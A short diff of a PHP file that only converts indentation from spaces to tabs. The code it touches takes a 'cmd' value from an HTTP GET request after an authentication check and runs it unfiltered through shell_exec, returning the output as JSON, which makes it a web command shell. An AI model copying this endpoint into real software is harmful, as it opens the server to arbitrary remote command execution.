@@ -17,17 +17,17 @@ if (!isAuthenticated()){
 }
 
 if (isset($_GET["cmd"])) {
-    // HTTP GET requests
-    $cmd = $_GET["cmd"];
-    $ret = "";
+	// HTTP GET requests
+	$cmd = $_GET["cmd"];
+	$ret = "";
 
-    if ("ostype" == $cmd) {
-        $ret = strtolower(PHP_OS);
-    }
-    else {
-        $ret = shell_exec($cmd);
-    }
+	if ("ostype" == $cmd) {
+		$ret = strtolower(PHP_OS);
+	}
+	else {
+		$ret = shell_exec($cmd);
+	}
 
-    echo json_encode(array("rsp"=>$ret));
+	echo json_encode(array("rsp"=>$ret));
 }
 ?>
